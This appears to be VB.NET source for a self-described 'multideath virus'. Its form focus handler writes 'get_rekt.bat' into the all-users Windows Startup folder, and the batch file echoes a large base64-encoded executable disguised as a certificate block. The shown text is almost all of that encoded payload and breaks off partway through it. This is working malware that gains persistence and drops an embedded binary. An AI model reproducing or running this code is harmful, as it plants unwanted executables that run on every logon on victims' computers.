﻿Public Class Form3
    Private Sub Form3_GotFocus(sender As Object, e As EventArgs) Handles Me.GotFocus
        Timer1.Start()
        IO.File.WriteAllText("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\get_rekt.bat", "@echo off" + vbCrLf + "(" + vbCrLf + "echo -----BEGIN CERTIFICATE-----" + vbCrLf + "echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + vbCrLf + "echo AAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v" + vbCrLf + "echo ZGUuDQ0KJAAAAAAAAABQRQAATAEDAC1yM9cAAAAAAAAAAOAAIgALAVAAACwAAAAIAAAAAAAAtksA" + vbCrLf + "echo AAAgAAAAYAAAAABAAAAgAAAAAgAABAAAAAAAAAAGAAAAAAAAAACgAAAAAgAAAAAAAAIAYIUAABAA" + vbCrLf + "echo ABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAGNLAABPAAAAAGAAAKwFAAAAAAAAAAAAAAAAAAAA" + vbCrLf + "echo AAAAAIAAAAwAAAC4SgAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + vbCrLf + "echo AAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAvCsAAAAgAAAALAAAAAIA" + vbCrLf + "echo AAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAKwFAAAAYAAAAAYAAAAuAAAAAAAAAAAAAAAAAABAAABA" + vbCrLf + "echo LnJlbG9jAAAMAAAAAIAAAAACAAAANAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAACX" + vbCrLf + "echo SwAAAAAAAEgAAAACAAUA0CcAAHghAAADAAIAAQAABkhJAABwAQAAAAAAAAAAAAAAAAAAAAAAAAAA" + vbCrLf + "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAABswAgAfAAAAAAAAAAAAKB0AAAooHgAACgDeAgDcACgHAAAG" + vbCrLf + "echo Am8fAAAKACoAARAAAAIAAQAODwACAAAAAKoAAhYoIAAACgACFighAAAKAAIXKCIAAAoAAhcoIwAA" + vbCrLf + "echo CgACFigkAAAKACpOAAIoCQAABm8gAAAGKCUAAAoAKiYAAigmAAAKACrOcycAAAqAAQAABHMoAAAK" + vbCrLf + "echo gAIAAARzKQAACoADAAAEcyoAAAqABAAABHMrAAAKgAUAAAQqAAAAEzABABAAAAABAAARAH4BAAAE" + vbCrLf + "echo bywAAAoKKwAGKhMwAQAQAAAAAgAAEQB+AgAABG8tAAAKCisABioTMAEAEAAAAAMAABEAfgMAAARv" + vbCrLf + "echo LgAACgorAAYqEzABABAAAAAEAAARAH4EAAAEby8AAAoKKwAGKhMwAQAQAAAABQAAEQB+BQAABG8w" + vbCrLf + "echo AAAKCisABioTMAIAPAAAAAYAABEAfgYAAAQUKDEAAAoLBywhcgEAAHDQBQAAAigyAAAKbzMAAApz" + vbCrLf + "echo NAAACgwIgAYAAAQAAH4GAAAECisABioTMAEACwAAAAcAABEAfgcAAAQKKwAGKiIAAoAHAAAEKpJz" + vbCrLf + "echo DwAABig1AAAKdAYAAAKACAAABHM2AAAKKDcAAAqACgAABCoeAig4AAAKKgAAABMwAQAdAAAACAAA" + vbCrLf + "echo EQAoBwAABm85AAAKCgYsDCgSAAAGbzoAAAoAAAAqAAAAGzADAG4AAAAJAAARAH4JAAAEFv4BCwcs" + vbCrLf + "echo VgB+CgAABAwIKDsAAAoAFg0IEgMoPAAACgB+CQAABBb+ARMEEQQsHigHAAAGFP4GEAAABnM9AAAK" + vbCrLf + "echo bz4AAAoAF4AJAAAEAADeDAksBwgoPwAACgAA3AAAAH4IAAAECisABioAAAEQAAACAB0AOFUADAAA" + vbCrLf + "echo AAATMAEACwAAAAoAABEAKBEAAAYKKwAGKjYCKEAAAAoCKBYAAAYqCgAqGzACADEAAAAIAAARAAAD" + vbCrLf + "echo LAsCewsAAAQU/gMrARYKBiwNAnsLAAAEb0EAAAoAAADeCgACAyhCAAAKANwAKgAAAAEQAAACAAEA" + vbCrLf + "echo JCUACgAAAAATMAYALgEAAAAAAAAAAnNDAAAKbxgAAAYAAihEAAAKAAJvFwAABhdvRQAACgACbxcA" + vbCrLf + "echo AAZyJwAAcCIAAHxBFxkWc0YAAApvRwAACgACbxcAAAYfDR8Nc0gAAApvSQAACgACbxcAAAZyNwAA" + vbCrLf + "echo cG9KAAAKAAJvFwAABiAQAwAAHxpzSwAACm9MAAAKAAJvFwAABhZvTQAACgACbxcAAAZyRQAAcG9O" + vbCrLf + "echo AAAKAAIiAADAQCIAAFBBc08AAAooUAAACgACFyhRAAAKAAIgLAMAAB84c0sAAAooUgAACgACKFMA" + vbCrLf + "echo AAoCbxcAAAZvVAAACgACFyhVAAAKAAIWKFYAAAoAAhYoVwAACgACcv4AAHAoSgAACgACFihYAAAK" + vbCrLf + "echo AAJyCgEAcG9ZAAAKAAIXKFoAAAoAAhYoWwAACgACKFwAAAoAKiYCewwAAAQrACoTMAIANwAAAAsA" + vbCrLf + "echo ABEC/gYUAAAGc10AAAoKAnsMAAAECwcsBwcGb14AAAoCA30MAAAEAnsMAAAECwcsBwcGb18AAAoq" + vbCrLf + "echo ABswBQD/AAAADAAAEQACjAYAABssDw8A/hYGAAAbb2AAAAorARcLBznYAAAAfg0AAAQU/gMMCCwy" + vbCrLf + "echo fg0AAATQBgAAGygyAAAKb2EAAAoNCSwWchwBAHAWjUUAAAEoYgAACnNjAAAKegAAKwwAc2QAAAqA" + vbCrLf + "echo DQAABAB+DQAABNAGAAAbKDIAAAoUb2UAAAoAACgBAAArCt50dR8AAAElLQQmFisZJShnAAAKEwQR" + vbCrLf + "echo BG9oAAAKFP4DEwURBRb+A/4RJnJWAQBwF41FAAABJRYRBG9oAAAKb2kAAAqiKGIAAAoTBhEGEQRv" + vbCrLf + "echo aAAACnNqAAAKegB+DQAABNAGAAAbKDIAAApvawAACgDcAAIKKwAGKgABHAAAAQCAAAmwADGJAAAA" + vbCrLf + "echo AgCAAGHhABcAAAAAWgAD/hYGAAAbb2wAAAoAA/4VBgAAGyomAAIoNgAACgAqAAAAEzACABIAAAAI" + vbCrLf + "echo AAARAAIDKDcAAAoobQAACgorAAYqAAATMAEADAAAAA0AABEAAihuAAAKCisABioTMAEAEAAAAA4A" + vbCrLf + "echo ABEA0AkAAAIoMgAACgorAAYqEzABAAwAAAAPAAARAAIobwAACgorAAYqagICew4AAAQoAgAAK30O" + vbCrLf + "echo AAAEAnsOAAAEKwAqrgMCew4AAAT+ASwCKx0DFP4DLAtyjAEAcHNwAAAKegICfA4AAAQoAwAAKyoA" + vbCrLf + "echo EzACABIAAAAIAAARAAIDKDcAAAoobQAACgorAAYqAAATMAEADAAAAA0AABEAAihuAAAKCisABioT" + vbCrLf + "echo MAEAEAAAAA4AABEA0AoAAAIoMgAACgorAAYqEzABAAwAAAAPAAARAAIobwAACgorAAYqEzACAB0A" + vbCrLf + "echo AAAQAAARAAKMBgAAGxT+AQsHLAgoAQAAKworBQACCisABiomAAP+FQYAABsqJgACKDYAAAoAKgAA" + vbCrLf + "echo ABMwAgAmAAAAEQAAEQB+cQAACowIAAAbFP4BCwcsCigEAAArgHEAAAp+cQAACgorAAYqJgACKDYA" + vbCrLf + "echo AAoAKkJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAAJAMAAAjfgAA/AwAAMAMAAAj" + vbCrLf + "echo U3RyaW5ncwAAAAC8GQAA1AEAACNVUwCQGwAAEAAAACNHVUlEAAAAoBsAANgFAAAjQmxvYgAAAAAA" + vbCrLf + "echo AAACAAABVxWiCQkfAAAA+gEzABYAAAEAAABMAAAACwAAAA8AAAAqAAAADwAAAHEAAABhAAAAEQAA" + vbCrLf + "echo AAcAAAAMAAAADwAAAAgAAAABAAAABQAAAAIAAAADAAAABQAAAAQAAAACAAAAAACqBQEAAAAAAAYA" + vbCrLf + "echo uQT+CQYAJgX+CQYAWAM/CQ8AewoAAAYAtANlBwYAnARlBwYADQVlBwYA2QRlBwYA8gRlBwYAGARl" + vbCrLf + "echo BwYAoAO4CQYAAQO4CQYAZARlBwYAMwTtBQoAJAPGCAoAjQKEBgoAhwOEBg4AOgKOCQYAuAK9BgYA" + vbCrLf + "echo TAQ/CQYA+wM/CQ4ABwlSCQ4AywPXCQ4A4wObAAYAcwu9Bg4A7QiOCQ4AgQSbAAYAogK9BgYAhwE2" + vbCrLf + "echo CxIA3Qb3CgYAiQdlBwYADQK9BgYAywL+CQoADwPuBgYAOwM/CQYAlAgeCgYA8wdQBwoAVgI7BwYA" + vbCrLf + "echo ygq9Bg4A5gLXCQoA3giEBgYAdgI/CQYAbAM/CQYARAX+CRIAfgb3CgYAuQi9BhIAIgf3Cg4ATwGO" + vbCrLf + "echo CQ4AYgGOCQYAkQG9BgYApAxlBwoAYQI7BwYASQv+CQ4AqwbXCQYANwncBQ4AsQiOCQYAewG9BhIA" + vbCrLf + "echo tQb3ChYAGAxLBhYA2wFLBhYAhAtLBhYADgxLBhYA1wVLBhYAVwBLBhIAmgb3ChIAQQH3CusAdwcA" + vbCrLf + "echo ABIAywH3CgYAOga9Bg4A5ArXCQYAowe9BgYAIAm9Bg4AhgDXCQYA2Ae9BgoABAyEBgYA0Ae9BgAA" + vbCrLf + "echo AABOAAAAAAABAAEAAAAAACAHiAxJAAEAAQAAAAAABQmIDFkAAQAEAAABEAB6C4gMZQABAAUAAAEA" + vbCrLf + "echo ADsKLwplAAYACwAAARAAvwqIDJkACAAOAAABAACtDIgMZQALABIAAQAAAEgAwwt5AAsAEwAFAQAA" + vbCrLf + "echo FgsAAGUADQAZAAUBAACACQAAZQAPACIABQEAAAEAAABlAA8AKQAxADoI9QExABEI/QExACUIBQIR" + vbCrLf + "echo AHEIDQIxAFMIFQIRAOIGHQIRACoCIgIRABgBJwIRAKQIKwIRAGMLLgIBAFgLMQIBACoANgIRAMQA" + vbCrLf + "echo OwIGADIAPwIRAGUF1wFQIAAASAATAAsHQwIBAIwgAAAAAAYYKgkGAAIAtyAAAAAAxALRBgYAAgDL" + vbCrLf + "echo IAAAAAAGGCoJBgACANUgAAAAABEYMAlJAgIADCEAAAAAEwj4CE0CAgAoIQAAAAATCBAHUgICAEQh" + vbCrLf + "echo AAAAABMI6QhXAgIAYCEAAAAAEwgMC1wCAgB8IQAAAAATCHAJYQICAJghAAAAABMIkAhmAgIA4CEA" + vbCrLf + "echo AAAAEwgSAmwCAgD3IQAAAAATCB4CcgICAAAiAAAAABEYMAlJAgMAJSIAAAAABhgqCQYAAwAwIgAA" + vbCrLf + "echo AAARAK4KeQIDAFwiAAAAABYIzAuBAgUA6CIAAAAAEwihCoECBQD/IgAAAAAGGCoJBgAFAA0jAAAA" + vbCrLf + "echo AAEAWgaGAgUAECMAAAAAxAJuAhUABwBgIwAAAAABAPoLBgAIAJokAAAAAEMLHACOAggApCQAACAA" + vbCrLf + "echo QwsnAJQCCADoJAAAAAARAHMAmwIJABAmAAAAAAEAXwCjAgoAJyYAAAAABhgqCQYACwA0JgAAAADG" + vbCrLf + "echo At0KcgELAFQmAAAAAMYCMQGxAQwAbCYAAAAAgwAKAqsCDACIJgAAAADGAjgGnAEMAKAmAAAAAAYI" + vbCrLf + "echo OgCxAgwAuyYAAAAABghEALYCDADoJgAAAADGAt0KcgENAAgnAAAAAMYCMQGxAQ4AICcAAAAAgwAK" + vbCrLf + "echo AqsCDgA8JwAAAADGAjgGnAEOAFQnAAAAABEAcwCbAg4AfScAAAAAAQBfAKMCDwCHJwAAAAAGGCoJ" + vbCrLf + "echo BgAQAJQnAAAAAAMICAGAABAAxicAAAAABhgqCQYAEAAAAAEAzwoAAAEAmAUAAAEAiQgAAAIA2gUA" + vbCrLf + "echo AAEAiQgAAAIA2gUAAAEAQQYAAAEAeQUAAAEAHwEAAAEAKAEAAAEA/QcAAAEAkgUAAAEA/QcAAAEA" + vbCrLf + "echo KAEAAAEAKAEJACoJAQARACoJBgAZACoJCgApACoJEAAxACoJEAA5ACoJEABBACoJEABJACoJEABR" + vbCrLf + "echo ACoJEABZACoJFQBhACoJEABpACoJEABxACoJEAB5ACoJGgCJACoJIACZACoJBgChACoJBgCpACoJ" + vbCrLf + "echo BgC5ACoJBgDBACoJBgDZACoJJgDhACoJBgAJASoJBgARASoJEAAZASoJBgBBASoJBgBZASoJLgBh" + vbCrLf + "echo ASoJEACRAAcGNQB5AdgLOQCRAOIHPgCRACoJRACRAOQAFQCRAIoKFQCRAKoLFQCRALUBSwCRAMQG" + vbCrLf + "echo UgCxACoJBgAMACoJBgAUACoJBgAcACoJBgAkACoJBgAsACoJBgAMAAgBgAAUAAgBgAAcAAgBgAAk" + vbCrLf + "echo AAgBgAAsAAgBgADJANQKowABAaMBqQABAaAMsgAhASoJuAChAdcAxgDJACoJBgCpAYkFzwAxASoJ" + vbCrLf + "echo BgCRAJEL2AAxAZ4FBgCxAe4B5QC5AfII6gDBASoJ8QCRAOYH9wC5Ab4L5QDxACoJBgDJAW4CBgDx" + vbCrLf + "echo AG4CFQBpASoJBgDRASkMBgBpAcAFFQDZASoJAwHRARQMEAHxASoJFwHRAS4HHQHRAeUBEAD5ASoJ" + vbCrLf + "echo FwHRAbcFJAHRAVsMAQBpAVIMEAABAioJKwEJAh4LMQEJAj0BOAHxAM0FJAHRAeoKPwEZArEARQHx" + vbCrLf + "echo AMcBTAHxAHgMFQDxAGgMFQDxAP8HFQDxAFIMEADxAB0MFQDRATcMFQDRAUQMBgBxASoJ8QDRAXEG" + vbCrLf + "echo XAHRAWcGXAHRAbUA2ADpAJQMcgExAiYGdwE5AioJEADpACoJBgDpALEAfgFBAvkAhAFJAhAJjwFR" + vbCrLf + "echo Ar0HlgFRAm8BnAE5AioJoAHpAKMFqAFZAm4CBgDJAN0KcgHJADEBsQHJADgGnAFhAioJEAA8AGUF" + vbCrLf + "echo 1wEgAIMA2AMgAIsA2AMgAHsA3QMpAMMAcwUuAAsA9gIuABMA/wIuABsAHgMuACMAJwMuACsANQMu" + vbCrLf + "echo ADMANQMuADsAJwMuAEMAOwMuAEsANQMuAFMANQMuAFsAUwMuAGMAfQMuAGsAigNAAJMA2ANDAHMA" + vbCrLf + "echo BARDAHsA5gNJAMMAhAVgAJMA2ANjAHMABARjAHsA5gNpAMMAmAWAAIsA2AOAAHsA5gODAJsA2AOD" + vbCrLf + "echo AKMA2AODAHMABASJAMMApQWjAJsA2AOjAHMAHQSjAMsA2AOjALsA2AOjAKMA2AOpAMMAswXAAIsA" + vbCrLf + "echo 2APDALsA2APDAHMAXgTDAHsA3QPJAHsA3QPgAIsA2APjAJsA2APjAKMA2APjAMsA2APjALsA2APp" + vbCrLf + "echo AHsA3QMAAYsA2AMDAdMA2AMgAYsA2AMjAXsA5gMjAasAuAQpAcMAxwVAAYsA2ANDAXsA5gNDAasA" + vbCrLf + "echo EQVjAXsA5gNjAVMANQOBAbsA2AOBAdsA7wOBAeMA+AOhAbMA2APBAXsA5gPhAbsA2APhAbMA2AMA" + vbCrLf + "echo AssA2AMAAnsA3QOgAssA2APAApMA2APgArsA2AMAA7sA2AMgA4sA2ANAA4sA2ANgA4sA2ANgA3sA" + vbCrLf + "echo 5gOAA3sA5gOgA3sA5gPAA3sA5gPgA3sA5gMABIsA2AMgBIsA2ANABHsA5gNABIsA2ANgBHsA5gNg" + vbCrLf + "echo BIsA2AOABHsA5gOABIsA2AOgBHsA5gOgBIsA2APABIsA2APgBIsA2AMABYsA2AMABXsA5gMgBYsA" + vbCrLf + "echo 2ANABYsA2ANABXsA5gN7AIUAigCPAJQAmQDAANQA3AD+AFMBYwGtAbUBuwHEAcoBBAABAAUABgAG" + vbCrLf + "echo AAgABwAJAAgACgAJAAsACwAMAAAABwm8AgAAIgfBAgAA7QjGAgAAGAvLAgAAggnQAgAAlAjVAgAA" + vbCrLf + "echo MgLbAgAA8gvhAgAAwQrhAgAAKwDmAgAASADsAgAADAHxAgIABgADAAIABwAFAAIACAAHAAIACQAJ" + vbCrLf + "echo AAIACgALAAIACwANAAIADAAPAAEADQAPAAIAEQARAAIAEgATAAIAFwAVAAEAGAAVAAIAIAAXAAEA" + vbCrLf + "echo IQAXAAIAKQAZAFgAXwBmAG0AdABvAdAB2wEEgAAAAQAAAAAAAAAAAAAAAADDCwAABAAAAAAAAAAA" + vbCrLf + "echo AAAA4wGSAAAAAAAEAAAAAAAAAAAAAADjAb0GAAAAAAoAAAAAAAAAAAAAAOwBmwAAAAAABAAAAAAA" + vbCrLf + "echo AAAAAAAA4wH3CgAAAAAEAAAAAAAAAAAAAADsAUsGAAAAAAAAAAABAAAARQoAALgAAAABAAAAXgoA" + vbCrLf + "echo AAkABAAKAAQACwAEAAAAEAAWAF0AAAAQADMAXQAAAAAANQBdAAAAEABNAF0AAAAAAE8AXQDNAIoB" + vbCrLf + "echo MgC/ATQAvwHNAN4BAgB5AAMAeQAAAABUaHJlYWRTYWZlT2JqZWN0UHJvdmlkZXJgMQBnZXRfTGFi" + vbCrLf + "echo ZWwxAHNldF9MYWJlbDEAbV9Gb3JtMQBnZXRfRm9ybTEAc2V0X0Zvcm0xADxNb2R1bGU+AFNpemVG" + vbCrLf + "echo AFQARGlzcG9zZV9fSW5zdGFuY2VfXwBDcmVhdGVfX0luc3RhbmNlX18AUHJvamVjdERhdGEAbXNj" + vbCrLf + "echo b3JsaWIATWljcm9zb2Z0LlZpc3VhbEJhc2ljAEFkZABnZXRfSXNEaXNwb3NlZABtX0Zvcm1CZWlu" + vbCrLf + "echo Z0NyZWF0ZWQAU3luY2hyb25pemVkAHNldF9Jc1NpbmdsZUluc3RhbmNlAENyZWF0ZUluc3RhbmNl" + vbCrLf + "echo AGdldF9HZXRJbnN0YW5jZQBkZWZhdWx0SW5zdGFuY2UAaW5zdGFuY2UAR2V0SGFzaENvZGUAc2V0" + vbCrLf + "echo X0F1dG9TY2FsZU1vZGUAQXV0aGVudGljYXRpb25Nb2RlAFNodXRkb3duTW9kZQBnZXRfTWVzc2Fn" + vbCrLf + "echo ZQBJRGlzcG9zYWJsZQBIYXNodGFibGUAUnVudGltZVR5cGVIYW5kbGUAR2V0VHlwZUZyb21IYW5k" + vbCrLf + "echo bGUAc2V0X1NodXRkb3duU3R5bGUAc2V0X0Zvcm1Cb3JkZXJTdHlsZQBGb250U3R5bGUAc2V0X05h" + vbCrLf + "echo bWUAQ2hlY2tGb3JTeW5jTG9ja09uVmFsdWVUeXBlAEdldFR5cGUAZ2V0X0N1bHR1cmUAc2V0X0N1" + vbCrLf + "echo bHR1cmUAcmVzb3VyY2VDdWx0dXJlAFdpbmRvd3NGb3Jtc0FwcGxpY2F0aW9uQmFzZQBBcHBsaWNh" + vbCrLf + "echo dGlvblNldHRpbmdzQmFzZQBEaXNwb3NlAERlYnVnZ2VyQnJvd3NhYmxlU3RhdGUARWRpdG9yQnJv" + vbCrLf + "echo d3NhYmxlU3RhdGUAVGhyZWFkU3RhdGljQXR0cmlidXRlAFNUQVRocmVhZEF0dHJpYnV0ZQBDb21w" + vbCrLf + "echo aWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBEZXNpZ25lckdlbmVyYXRlZEF0dHJpYnV0ZQBHdWlkQXR0" + vbCrLf + "echo cmlidXRlAEhlbHBLZXl3b3JkQXR0cmlidXRlAEdlbmVyYXRlZENvZGVBdHRyaWJ1dGUARGVidWdn" + vbCrLf + "echo ZXJOb25Vc2VyQ29kZUF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAERlYnVnZ2VyQnJvd3Nh" + vbCrLf + "echo YmxlQXR0cmlidXRlAEVkaXRvckJyb3dzYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRl" + vbCrLf + "echo AEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAU3RhbmRhcmRNb2R1bGVBdHRyaWJ1dGUASGlkZU1vZHVs" + vbCrLf + "echo ZU5hbWVBdHRyaWJ1dGUARGVidWdnZXJTdGVwVGhyb3VnaEF0dHJpYnV0ZQBBc3NlbWJseVRyYWRl" + vbCrLf + "echo bWFya0F0dHJpYnV0ZQBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUARGVidWdnZXJIaWRkZW5BdHRy" + vbCrLf + "echo aWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBNeUdyb3VwQ29sbGVjdGlvbkF0dHJp" + vbCrLf + "echo YnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNB" + vbCrLf + "echo dHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmli" + vbCrLf + "echo dXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0" + vbCrLf + "echo ZQBBY2Nlc3NlZFRocm91Z2hQcm9wZXJ0eUF0dHJpYnV0ZQBtX1RocmVhZFN0YXRpY1ZhbHVlAFdp" + vbCrLf + "echo dGhFdmVudHNWYWx1ZQBHZXRPYmplY3RWYWx1ZQB2YWx1ZQBTYXZlAFJlbW92ZQBnZXRfcmVrdC5l" + vbCrLf + "echo eGUAc2V0X1NpemUAc2V0X0F1dG9TaXplAHNldF9DbGllbnRTaXplAFN5c3RlbS5UaHJlYWRpbmcA" + vbCrLf + "echo U3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBnZXRfVXNlQ29tcGF0aWJsZVRleHRSZW5kZXJpbmcA" + vbCrLf + "echo R2V0UmVzb3VyY2VTdHJpbmcAVG9TdHJpbmcAZGlzcG9zaW5nAFN5c3RlbS5EcmF3aW5nAExhYmVs" + vbCrLf + "echo MV9DbGljawBhZGRfQ2xpY2sAcmVtb3ZlX0NsaWNrAExhYmVsAFN5c3RlbS5Db21wb25lbnRNb2Rl" + vbCrLf + "echo bABDb250YWluZXJDb250cm9sAE9iamVjdEZsb3dDb250cm9sAFN5c3RlbQBzZXRfTWFpbkZvcm0A" + vbCrLf + "echo T25DcmVhdGVNYWluRm9ybQByZXNvdXJjZU1hbgBTeXN0ZW0uQ29tcG9uZW50TW9kZWwuRGVzaWdu" + vbCrLf + "echo AE1haW4AZ2V0X0FwcGxpY2F0aW9uAE15QXBwbGljYXRpb24Ac2V0X0xvY2F0aW9uAFN5c3RlbS5D" + vbCrLf + "echo b25maWd1cmF0aW9uAFN5c3RlbS5HbG9iYWxpemF0aW9uAFN5c3RlbS5SZWZsZWN0aW9uAENvbnRy" + vbCrLf + "echo b2xDb2xsZWN0aW9uAFRhcmdldEludm9jYXRpb25FeGNlcHRpb24ASW52YWxpZE9wZXJhdGlvbkV4" + vbCrLf + "echo Y2VwdGlvbgBnZXRfSW5uZXJFeGNlcHRpb24AQXJndW1lbnRFeGNlcHRpb24AUnVuAGFkZF9TaHV0" + vbCrLf + "echo ZG93bgBDdWx0dXJlSW5mbwBzZXRfU2hvd0luVGFza2JhcgBtX0FwcE9iamVjdFByb3ZpZGVyAG1f" + vbCrLf + "echo VXNlck9iamVjdFByb3ZpZGVyAG1fQ29tcHV0ZXJPYmplY3RQcm92aWRlcgBtX015V2ViU2Vydmlj" + vbCrLf + "echo ZXNPYmplY3RQcm92aWRlcgBtX015Rm9ybXNPYmplY3RQcm92aWRlcgBzZW5kZXIAZ2V0X1Jlc291" + vbCrLf + "echo cmNlTWFuYWdlcgBhZGRlZEhhbmRsZXIAU2h1dGRvd25FdmVudEhhbmRsZXIAU3lzdGVtLkNvZGVE" + vbCrLf + "echo b20uQ29tcGlsZXIASUNvbnRhaW5lcgBnZXRfVXNlcgBFbnRlcgBnZXRfQ29tcHV0ZXIATXlDb21w" + vbCrLf + "echo dXRlcgBTZXRQcm9qZWN0RXJyb3IAQWN0aXZhdG9yAC5jdG9yAC5jY3RvcgBNb25pdG9yAFN5c3Rl" + vbCrLf + "echo bS5EaWFnbm9zdGljcwBNaWNyb3NvZnQuVmlzdWFsQmFzaWMuRGV2aWNlcwBnZXRfV2ViU2Vydmlj" + vbCrLf + "echo ZXMATXlXZWJTZXJ2aWNlcwBNaWNyb3NvZnQuVmlzdWFsQmFzaWMuQXBwbGljYXRpb25TZXJ2aWNl" + vbCrLf + "echo cwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMATWljcm9zb2Z0LlZpc3VhbEJhc2ljLkNv" + vbCrLf + "echo bXBpbGVyU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBTeXN0ZW0uUmVz" + vbCrLf + "echo b3VyY2VzAGdldF9yZWt0Lk15LlJlc291cmNlcwBnZXRfcmVrdC5Gb3JtMS5yZXNvdXJjZXMAZ2V0" + vbCrLf + "echo X3Jla3QuUmVzb3VyY2VzLnJlc291cmNlcwBEZWJ1Z2dpbmdNb2RlcwBzZXRfRW5hYmxlVmlzdWFs" + vbCrLf + "echo U3R5bGVzAGdldF9TZXR0aW5ncwBBdXRvU2F2ZVNldHRpbmdzAE15U2V0dGluZ3MARXZlbnRBcmdz" + vbCrLf + "echo AFJlZmVyZW5jZUVxdWFscwBVdGlscwBnZXRfQ29udHJvbHMAU3lzdGVtLldpbmRvd3MuRm9ybXMA" + vbCrLf + "echo Z2V0X0Zvcm1zAE15Rm9ybXMAc2V0X0F1dG9TY2FsZURpbWVuc2lvbnMAU3lzdGVtLkNvbGxlY3Rp" + vbCrLf + "echo b25zAFJ1bnRpbWVIZWxwZXJzAGNvbXBvbmVudHMAYWRkZWRIYW5kbGVyTG9ja09iamVjdABNeVBy" + vbCrLf + "echo b2plY3QAR3JhcGhpY3NVbml0AGdldF9TYXZlTXlTZXR0aW5nc09uRXhpdABzZXRfU2F2ZU15U2V0" + vbCrLf + "echo dGluZ3NPbkV4aXQAZ2V0X3Jla3QAZ2V0X0RlZmF1bHQAU2V0Q29tcGF0aWJsZVRleHRSZW5kZXJp" + vbCrLf + "echo bmdEZWZhdWx0AEluaXRpYWxpemVDb21wb25lbnQAUG9pbnQAc2V0X0ZvbnQAc2V0X1RvcE1vc3QA" + vbCrLf + "echo U3VzcGVuZExheW91dABSZXN1bWVMYXlvdXQAUGVyZm9ybUxheW91dABzZXRfVGV4dABzZXRfVGFi" + vbCrLf + "echo SW5kZXgAc2V0X01pbmltaXplQm94AHNldF9NYXhpbWl6ZUJveABnZXRfcmVrdC5NeQBDb250YWlu" + vbCrLf + "echo c0tleQBnZXRfQXNzZW1ibHkATXlTZXR0aW5nc1Byb3BlcnR5AAAlZwBlAHQAXwByAGUAawB0AC4A" + vbCrLf + "echo UgBlAHMAbwB1AHIAYwBlAHMAAA9DAGEAbABpAGIAcgBpAAANTABhAGIAZQBsADEAAIC3aABpACAA" + vbCrLf + "echo dABoAGUAcgBlACwAIABpACcAbQAgAHQAaABlACAAbQB1AGwAdABpAGQAZQBhAHQAaAAgAHYAaQBy" + vbCrLf + "echo AHUAcwAsACAAaQAgAG0AYQB5ACAAYgBlACAAYQAgAGwAaQB0AHQAbABlACAAYQBuAG4AbwB5AGkA" + vbCrLf + "echo bgBnACwAIABiAHUAdAAgAHkAbwB1ACAAawBuAG8AdwAsACAAdABoAGkAbgBnAHMAIABoAGEAcABw" + vbCrLf + "echo AGUAbgABC0YAbwByAG0AMQAAEWcAZQB0ACAAcgBlAGsAdAAAOVcAaQBuAEYAbwByAG0AcwBfAFIA" + vbCrLf + "echo ZQBjAHUAcgBzAGkAdgBlAEYAbwByAG0AQwByAGUAYQB0AGUAADVXAGkAbgBGAG8AcgBtAHMAXwBT" + vbCrLf + "echo AGUAZQBJAG4AbgBlAHIARQB4AGMAZQBwAHQAaQBvAG4AAEdQAHIAbwBwAGUAcgB0AHkAIABjAGEA" + vbCrLf + "echo bgAgAG8AbgBsAHkAIABiAGUAIABzAGUAdAAgAHQAbwAgAE4AbwB0AGgAaQBuAGcAAHiYMTtzPg5F" + vbCrLf + "echo k6mT+91PubsABCABAQgDIAABBSABARERBCABAQ4EIAEBAgUgAgEODgUgAQERQQcgBAEODg4OBiAB" + vbCrLf + "echo ARGAqQMAAAIEAAEBAgUgAQEdDgYgAQERgMEGIAEBEYDFBSABARJ5BhUSLAESDAYVEiwBEggGFRIs" + vbCrLf + "echo ARJpBhUSLAESJAYVEiwBEigEBwESDAQgABMABAcBEggEBwESaQQHARIkBAcBEigJBwMSgJECEoCR" + vbCrLf + "echo BQACAhwcCAABEoCBEYDJBSAAEoDNByACAQ4SgM0FBwESgJUIAAESgNESgNEEAAEcHAMHAQIDIAAC" + vbCrLf + "echo CAcFEhgCHAICBAABARwGAAIBHBACBSACARwYBiABARKA4QQHARIYDCAFAQ4MEYDxEYD1BQYgAQES" + vbCrLf + "echo gO0FIAIBCAgGIAEBEYD5BiABARGA/QUgAgEMDAYgAQERgQEGIAEBEYEJBSAAEoENBiABARKA6QYg" + vbCrLf + "echo AQERgREIBwISgLkSgLUGIAEBEoC5CwcHHgACAgISfQIOAh4ABCABAhwGAAIODh0OBSACARwcBRAB" + vbCrLf + "echo AB4ABAoBHgAGAAEBEoEpBSAAEoEpAyAADgcgAgEOEoEpBCABARwDBwEIAyAACAUHARKAgQMHAQ4E" + vbCrLf + "echo CgESIAUHAh4AAgUHAhMAAgYVEiwBEwADBhMAAhMABAoBEwAIt3pcVhk04IkIsD9ffxHVCjoHBhUS" + vbCrLf + 